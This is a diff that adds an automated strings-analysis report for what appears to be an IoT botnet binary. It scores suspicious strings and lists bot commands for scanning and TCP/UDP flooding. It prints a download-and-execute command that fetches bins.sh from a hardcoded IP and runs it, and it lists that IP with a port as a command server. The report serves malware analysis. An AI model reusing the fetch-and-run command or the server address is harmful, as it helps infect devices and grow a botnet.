@@ -1,0 +1,168 @@
+=============================================================================
+========	BINARY ID :35a2941cba0bc819fb616b4628db5092977b6a50==================================================
+================================================================================
+================================================================================
+========	STRINGS SUMMARY : =====================================================
+================================================================================
+TOTAL STRINGS COUNT :1965
+SUPSCPECTED LINES COUNT :125
+SUPSCPECTED STRINGS COUNT (DISTINCT) :23
+SUPSCPECTED STRINGS WEIGHT :87
+SUSPECT STRING SCORE : [87 / 150] 57%
+USER AGENTS STRINGS COUNT :0
+STATIC IPs STRINGS COUNT :2
+DYNAMIC IPs STRINGS COUNT :1
+================================================================================
+========	STRINGS DETAILS : =====================================================
+================================================================================
+================================================================================
+========	SUSPECTED STRINGS : =====================================================
+================================================================================
+busybox wget || wget 185.158.113.30/bins.sh; busybox tftp || tftp -g -r 185.158.113.30 bins.sh; sh bins.sh || bash bins.sh\r\n
+/bin/sh
+/proc/cpuinfo
+PING
+Invalid flag "%s"
+GETLOCALIP
+KILLATTK
+/proc/net/route
+%sWelcome to the botnet [%s:%s:%d cores] :)%s
+%sCould not connect to commServer!%s\n
+SCANNER
+SCANNER ON | OFF
+SCANNER STOPPED!
+attempting to start scanner
+SCANNER STARTED!
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+No such process
+Interrupted system call
+No child processes
+Too many open files in system
+Read-only file system
+Level 2 not synchronized
+Machine is not on the network
+Name not unique on network
+Interrupted system call should be restarted
+Socket operation on non-socket
+Protocol wrong type for socket
+Socket type not supported
+Network is down
+Network is unreachable
+Network dropped connection on reset
+Software caused connection abort
+Connection reset by peer
+Transport endpoint is already connected
+Transport endpoint is not connected
+Connection timed out
+Connection refused
+Host is down
+No route to host
+Operation already in progress
+Operation now in progress
+fdopen_pids
+libc/sysdeps/linux/m68k/vfork.S
+fork.c
+getpid.c
+kill.c
+__syscall_kill
+sigprocmask.c
+waitpid.c
+spec_flags.4040
+strstr.c
+_string_syserrmsgs.c
+inet_ntoa.c
+inet_makeaddr.c
+connect.c
+socket.c
+rand.c
+random.c
+randtbl
+random_r.c
+random_poly_info
+__socketcall.c
+inet_aton.c
+__socketcall
+waitpid
+random
+connect
+numpids
+initConnection
+sendTCP
+getRandomPublicIP
+__GI_random_r
+getpid
+getHost
+__libc_getpid
+makeRandomStr
+getRandomIP
+random_r
+tcpcsum
+socket
+_string_syserrmsgs
+__GI_inet_ntoa
+getProperBinary
+srandom_r
+__GI_inet_ntoa_r
+__GI_srandom_r
+kill
+__GI_sigprocmask
+inet_addr
+connectTimeout
+__GI_kill
+strstr
+init_rand
+rand
+fork
+__GI_random
+__GI_fork
+__GI_getpid
+inet_aton
+processCmd
+__GI_socket
+listFork
+srand
+inet_ntoa
+sendUDP
+__vfork
+__libc_waitpid
+__GI_waitpid
+vfork
+srandom
+__libc_fork
+scanPid
+rand_cmwc
+inet_ntoa_r
+__GI_strstr
+__GI_connect
+__GI_inet_aton
+__GI_vfork
+__GI_inet_addr
+__libc_connect
+pids
+sigprocmask
+Jgꠀ渠渢ࠠ"觥Ġ裥膐袐胐\bሀ倭渢渠ࠠ"觥Ġ裥膐袐胐觐䀠遂衘遂衘遂衘遂衘遂衘偂渠渢ࠠ"觥Ġ裥膐袐胐\bሀ긠⸤｡
+/a㫺轐聊ᑧ⸢ﳿ⸠㘠퀌渠ࠀ耡⠜깒渠ࠀ⠠ᰀ联꺰n䛿㑠渠ࠀ簑Ā☀渠ࠀ⠠ᰀ$諥탿ࠠ聐⡲껒ࠀȯ/į｡
+Jf烿⸢ﳿ⸠ࠀĤ肔Ƞ聖䀭⸠ἤ幎畎噎ȯ渭ࠀ깓ࠀͰ꺰ကd븀⸠က裤䀭ﳿ渠
+================================================================================
+========	USER AGENTS STRINGS : =====================================================
+================================================================================
+================================================================================
+========	STATIC IP ADRESSES : =====================================================
+================================================================================
+nN^Nu185.158.113.30:954
+8.8.8.8
+================================================================================
+========	DYNAMIC IP MASKS : =====================================================
+================================================================================
+%d.%d.%d.%d
+================================================================================
+========	/proc FOLDER ACCESS : =====================================================
+================================================================================
+/proc/cpuinfo
+/proc/net/route
+================================================================================
+========	HISTORY TEMPERING : =====================================================
+================================================================================
+================================================================================
+========	AUTOINSTALL COMMANDS : =====================================================
+================================================================================
